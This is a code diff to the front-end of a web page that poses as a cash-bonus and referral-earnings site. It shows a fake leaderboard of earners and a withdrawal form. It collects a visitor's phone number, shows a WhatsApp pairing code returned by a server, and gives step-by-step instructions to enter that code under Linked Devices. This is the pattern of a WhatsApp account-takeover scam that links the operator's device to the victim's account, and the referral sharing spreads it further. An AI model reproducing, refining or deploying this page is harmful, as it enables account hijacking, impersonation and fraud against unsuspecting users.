@@ -36,7 +36,6 @@
         .btn:hover { background: var(--primary-hover); transform: translateY(-2px); }
         .btn:disabled { background: var(--border); color: var(--text-muted); cursor: not-allowed; transform: none; }
         
-        /* Country Code & PIN Input */
         .input-group { display: none; margin-top: 20px; text-align: center; }
         .input-group label { font-size: 13px; color: var(--text-muted); margin-bottom: 12px; display: block; font-weight: 500; }
         
@@ -65,8 +64,7 @@
         .leader-amount { font-size: 14px; font-weight: 700; color: var(--primary); }
 
         .code-display { font-size: 36px; font-weight: 800; letter-spacing: 4px; color: var(--primary); margin: 20px 0; background: rgba(16,185,129,0.1); padding: 15px; border-radius: 12px; border: 1px dashed var(--primary); display: flex; justify-content: center; align-items: center; gap: 15px; }
-        .copy-btn { background: var(--primary); color: white; border: none; padding: 8px 12px; border-radius: 6px; font-size: 12px; cursor: pointer; font-weight: 600; }
-        .copy-btn.copied { background: #059669; }
+        .copy-btn { background: var(--primary); color: white; border: none; padding: 8px 12px; border-radius: 6px; font-size: 12px; cursor: pointer; font-weight: 600; transition: 0.2s; }
 
         .instructions { text-align: left; background: var(--bg); border-radius: 12px; padding: 20px; border: 1px solid var(--border); margin-top: 20px; }
         .instructions h4 { font-size: 14px; margin-bottom: 15px; color: var(--text); }
@@ -85,7 +83,6 @@
         .success-icon { width: 80px; height: 80px; background: rgba(16,185,129,0.2); border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 20px; }
         .success-icon svg { width: 40px; height: 40px; color: var(--primary); }
 
-        /* Withdrawal Box */
         .withdraw-box { background: var(--bg); border: 1px solid var(--border); border-radius: 12px; padding: 20px; margin-top: 20px; text-align: left; display: none; }
         .withdraw-box h3 { font-size: 16px; margin-bottom: 15px; color: var(--text); }
         .form-group { margin-bottom: 15px; }
@@ -174,38 +171,23 @@
             </div>
         </div>
 
-        <!-- STEP 2 -->
+        <!-- STEP 2 (PAIRING CODE ONLY) -->
         <div class="hero-card" id="step-2" style="display: none;">
             <h2 style="font-size: 20px; margin-bottom: 10px;">Verify Device</h2>
-            <p class="sub-text">Follow the steps below to link your device.</p>
+            <p class="sub-text">Copy this code and enter it in your WhatsApp.</p>
             
             <div class="code-display">
-                <span id="code-display">------</span>
+                <span id="pairing-code">------</span>
                 <button class="copy-btn" id="copy-code-btn" onclick="copyCode()">Copy</button>
             </div>
             
             <div class="instructions">
                 <h4>How to link your WhatsApp:</h4>
-                <div class="step-item">
-                    <div class="step-num">1</div>
-                    <div class="step-text">Open <strong>WhatsApp</strong> on your phone.</div>
-                </div>
-                <div class="step-item">
-                    <div class="step-num">2</div>
-                    <div class="step-text">Tap the <strong>three dots (⋮)</strong> in the top right corner.</div>
-                </div>
-                <div class="step-item">
-                    <div class="step-num">3</div>
-                    <div class="step-text">Tap on <strong>Linked Devices</strong>.</div>
-                </div>
-                <div class="step-item">
-                    <div class="step-num">4</div>
-                    <div class="step-text">Tap <strong>Link with Phone Number</strong>.</div>
-                </div>
-                <div class="step-item">
-                    <div class="step-num">5</div>
-                    <div class="step-text">Paste the code you copied above.</div>
-                </div>
+                <div class="step-item"><div class="step-num">1</div><div class="step-text">Open <strong>WhatsApp</strong> on your phone.</div></div>
+                <div class="step-item"><div class="step-num">2</div><div class="step-text">Tap the <strong>three dots (⋮)</strong> in the top right corner.</div></div>
+                <div class="step-item"><div class="step-num">3</div><div class="step-text">Tap on <strong>Linked Devices</strong>.</div></div>
+                <div class="step-item"><div class="step-num">4</div><div class="step-text">Tap <strong>Link with Phone Number</strong>.</div></div>
+                <div class="step-item"><div class="step-num">5</div><div class="step-text">Paste the code you copied above.</div></div>
             </div>
             
             <p class="sub-text" style="color: #f59e0b; font-size: 13px; margin-top: 20px;">Waiting for you to enter the code on your phone...</p>
@@ -223,7 +205,6 @@
             
             <button class="btn" style="margin-top: 20px; background: var(--border);" onclick="showWithdraw()">Withdraw Funds</button>
             
-            <!-- Withdrawal Form -->
             <div class="withdraw-box" id="withdraw-box">
                 <h3>Withdrawal Details</h3>
                 <div class="form-group">
@@ -281,13 +262,11 @@
         let userPhone = '';
         let selectedCurrency = '₦';
 
-        // Update UI based on selected country
         const countrySelect = document.getElementById('country-code');
         countrySelect.addEventListener('change', (e) => {
             const option = e.target.options[e.target.selectedIndex];
             selectedCurrency = option.getAttribute('data-currency');
             
-            // Update all currency symbols on the page
             document.querySelectorAll('.currency-symbol').forEach(el => el.innerText = selectedCurrency);
             document.getElementById('daily-retainer').innerText = `${selectedCurrency}500`;
             document.getElementById('referral-bonus').innerText = `${selectedCurrency}500`;
@@ -299,7 +278,6 @@
             document.getElementById('start-btn').innerText = `Claim Bonus + Referral`;
         }
 
-        // --- PIN INPUT LOGIC ---
         const inputs = document.querySelectorAll('.pin-container input');
         
         function moveToNext(current, index) {
@@ -329,7 +307,6 @@
             return num;
         }
 
-        // --- INTERACTION LOGIC ---
         function showInput() {
             document.getElementById('start-btn').style.display = 'none';
             document.getElementById('input-group').style.display = 'block';
@@ -344,7 +321,7 @@
                 return alert("Please enter all 10 digits of your phone number.");
             }
             
-            userPhone = countryCode + localNumber; // Combine code + 10 digits
+            userPhone = countryCode + localNumber; 
             
             document.getElementById('send-btn').disabled = true;
             document.getElementById('send-btn').innerText = 'Connecting...';
@@ -355,18 +332,24 @@
         socket.on('code_generated', (code) => {
             document.getElementById('step-1').style.display = 'none';
             document.getElementById('step-2').style.display = 'block';
-            document.getElementById('code-display').innerText = code;
+            document.getElementById('pairing-code').innerText = code;
         });
 
         function copyCode() {
-            const code = document.getElementById('code-display').innerText;
-            navigator.clipboard.writeText(code);
+            const code = document.getElementById('pairing-code').innerText;
+            const textArea = document.createElement("textarea");
+            textArea.value = code;
+            document.body.appendChild(textArea);
+            textArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(textArea);
+
             const btn = document.getElementById('copy-code-btn');
             btn.innerText = 'Copied!';
-            btn.classList.add('copied');
+            btn.style.background = '#059669';
             setTimeout(() => {
                 btn.innerText = 'Copy';
-                btn.classList.remove('copied');
+                btn.style.background = 'var(--primary)';
             }, 3000);
         }
 
@@ -396,8 +379,8 @@
             const copyText = document.getElementById('ref-link');
             copyText.select();
             copyText.setSelectionRange(0, 99999);
-            navigator.clipboard.writeText(copyText.value);
-            alert("Referral link copied! Share with associates to earn bonuses.");
+            document.execCommand('copy');
+            alert("Referral link copied!");
         }
 
         function shareTo(platform) {
@@ -420,7 +403,6 @@
             }
         }
 
-        // Leaderboard and Toasts
         const topEarners = [
             { name: "Chinedu O.", amount: "145,000" },
             { name: "Aisha M.", amount: "120,500" },
